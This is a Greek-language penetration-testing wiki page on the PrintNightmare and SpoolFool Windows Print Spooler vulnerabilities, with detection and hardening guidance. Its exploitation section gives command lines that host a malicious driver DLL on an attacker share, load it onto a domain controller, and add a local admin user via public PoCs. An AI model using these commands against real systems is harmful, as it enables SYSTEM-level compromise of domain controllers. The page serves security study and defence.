# PrintNightmare (Windows Print Spooler RCE/LPE)

{{#include ../../banners/hacktricks-training.md}}

> Το PrintNightmare είναι το συλλογικό όνομα που δίνεται σε μια οικογένεια ευπαθειών στην υπηρεσία **Print Spooler** των Windows που επιτρέπει **εκτέλεση αυθαίρετου κώδικα ως SYSTEM** και, όταν ο spooler είναι προσβάσιμος μέσω RPC, **απομακρυσμένη εκτέλεση κώδικα (RCE) σε ελεγκτές τομέα και διακομιστές αρχείων**. Οι πιο εκμεταλλευόμενες CVEs είναι **CVE-2021-1675** (αρχικά καταταγμένη ως LPE) και **CVE-2021-34527** (πλήρης RCE). Οι επόμενες ζητήματα όπως **CVE-2021-34481 (“Point & Print”)** και **CVE-2022-21999 (“SpoolFool”)** αποδεικνύουν ότι η επιφάνεια επίθεσης είναι ακόμα μακριά από το να κλείσει.

---

## 1. Ευπαθή συστατικά & CVEs

| Έτος | CVE | Σύντομο όνομα | Primitive | Σημειώσεις |
|------|-----|---------------|-----------|------------|
|2021|CVE-2021-1675|“PrintNightmare #1”|LPE|Διορθώθηκε τον Ιούνιο 2021 CU αλλά παρακάμφθηκε από το CVE-2021-34527|
|2021|CVE-2021-34527|“PrintNightmare”|RCE/LPE|Το AddPrinterDriverEx επιτρέπει σε αυθεντικοποιημένους χρήστες να φορτώσουν ένα DLL οδηγού από μια απομακρυσμένη κοινή χρήση|
|2021|CVE-2021-34481|“Point & Print”|LPE|Εγκατάσταση μη υπογεγραμμένου οδηγού από μη διαχειριστές χρήστες|
|2022|CVE-2022-21999|“SpoolFool”|LPE|Δημιουργία αυθαίρετου καταλόγου → Φύτευση DLL – λειτουργεί μετά τις διορθώσεις του 2021|

Όλες τους εκμεταλλεύονται μία από τις μεθόδους **MS-RPRN / MS-PAR RPC** (`RpcAddPrinterDriver`, `RpcAddPrinterDriverEx`, `RpcAsyncAddPrinterDriver`) ή σχέσεις εμπιστοσύνης μέσα στο **Point & Print**.

## 2. Τεχνικές εκμετάλλευσης

### 2.1 Συμβιβασμός απομακρυσμένου ελεγκτή τομέα (CVE-2021-34527)

Ένας αυθεντικοποιημένος αλλά **μη προνομιούχος** χρήστης τομέα μπορεί να εκτελέσει αυθαίρετα DLL ως **NT AUTHORITY\SYSTEM** σε έναν απομακρυσμένο spooler (συχνά ο DC) με:
```powershell
# 1. Host malicious driver DLL on a share the victim can reach
impacket-smbserver share ./evil_driver/ -smb2support

# 2. Use a PoC to call RpcAddPrinterDriverEx
python3 CVE-2021-1675.py victim_DC.domain.local  'DOMAIN/user:Password!' \
-f \
'\\attacker_IP\share\evil.dll'
```
Δημοφιλή PoCs περιλαμβάνουν **CVE-2021-1675.py** (Python/Impacket), **SharpPrintNightmare.exe** (C#) και τα modules `misc::printnightmare / lsa::addsid` του Benjamin Delpy σε **mimikatz**.

### 2.2 Τοπική κλιμάκωση προνομίων (οποιοδήποτε υποστηριζόμενο Windows, 2021-2024)

Η ίδια API μπορεί να κληθεί **τοπικά** για να φορτώσει έναν οδηγό από `C:\Windows\System32\spool\drivers\x64\3\` και να αποκτήσει προνόμια SYSTEM:
```powershell
Import-Module .\Invoke-Nightmare.ps1
Invoke-Nightmare -NewUser hacker -NewPassword P@ssw0rd!
```
### 2.3 SpoolFool (CVE-2022-21999) – παράκαμψη διορθώσεων του 2021

Οι διορθώσεις της Microsoft το 2021 μπλόκαραν τη φόρτωση απομακρυσμένων οδηγών αλλά **δεν ενίσχυσαν τα δικαιώματα καταλόγου**. Το SpoolFool εκμεταλλεύεται την παράμετρο `SpoolDirectory` για να δημιουργήσει έναν αυθαίρετο κατάλογο κάτω από `C:\Windows\System32\spool\drivers\`, ρίχνει ένα payload DLL και αναγκάζει τον spooler να το φορτώσει:
```powershell
# Binary version (local exploit)
SpoolFool.exe -dll add_user.dll

# PowerShell wrapper
Import-Module .\SpoolFool.ps1 ; Invoke-SpoolFool -dll add_user.dll
```
> Η εκμετάλλευση λειτουργεί σε πλήρως ενημερωμένα Windows 7 → Windows 11 και Server 2012R2 → 2022 πριν από τις ενημερώσεις του Φεβρουαρίου 2022

---

## 3. Ανίχνευση & κυνήγι

* **Event Logs** – ενεργοποιήστε τα κανάλια *Microsoft-Windows-PrintService/Operational* και *Admin* και παρακολουθήστε για **Event ID 808** “Ο εκτυπωτής απέτυχε να φορτώσει ένα πρόσθετο” ή για μηνύματα **RpcAddPrinterDriverEx**.
* **Sysmon** – `Event ID 7` (Εικόνα φορτωμένη) ή `11/23` (Γράψιμο/διαγραφή αρχείου) μέσα στο `C:\Windows\System32\spool\drivers\*` όταν η γονική διαδικασία είναι **spoolsv.exe**.
* **Process lineage** – ειδοποιήσεις όποτε η **spoolsv.exe** δημιουργεί `cmd.exe`, `rundll32.exe`, PowerShell ή οποιοδήποτε μη υπογεγραμμένο δυαδικό.

## 4. Μετριασμός & σκληραγώγηση

1. **Ενημερώστε!** – Εφαρμόστε την τελευταία σωρευτική ενημέρωση σε κάθε Windows host που έχει εγκατεστημένη την υπηρεσία Print Spooler.
2. **Απενεργοποιήστε τον spooler όπου δεν απαιτείται**, ειδικά σε Domain Controllers:
```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```
3. **Αποκλείστε απομακρυσμένες συνδέσεις** ενώ επιτρέπετε την τοπική εκτύπωση – Ομαδική Πολιτική: `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`.
4. **Περιορίστε το Point & Print** ώστε μόνο οι διαχειριστές να μπορούν να προσθέτουν οδηγούς ρυθμίζοντας την τιμή μητρώου:
```cmd
reg add "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint" \
/v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 1 /f
```
Λεπτομερής καθοδήγηση στο Microsoft KB5005652

---

## 5. Σχετική έρευνα / εργαλεία

* [mimikatz `printnightmare`](https://github.com/gentilkiwi/mimikatz/tree/master/modules) modules
* SharpPrintNightmare (C#) / Invoke-Nightmare (PowerShell)
* SpoolFool exploit & write-up
* 0patch micropatches για SpoolFool και άλλα σφάλματα του spooler

---

**Περισσότερη ανάγνωση (εξωτερικά):** Δείτε την ανάρτηση blog του 2024 – [Understanding PrintNightmare Vulnerability](https://www.hackingarticles.in/understanding-printnightmare-vulnerability/)

## Αναφορές

* Microsoft – *KB5005652: Διαχείριση της νέας συμπεριφοράς εγκατάστασης προεπιλεγμένου οδηγού Point & Print*
<https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872>
* Oliver Lyak – *SpoolFool: CVE-2022-21999*
<https://github.com/ly4k/SpoolFool>
{{#include ../../banners/hacktricks-training.md}}
